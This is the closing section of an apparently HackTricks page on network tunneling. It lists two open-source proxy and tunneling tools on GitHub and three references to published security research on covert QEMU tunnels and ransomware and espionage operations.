---

## 확인할 기타 도구

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
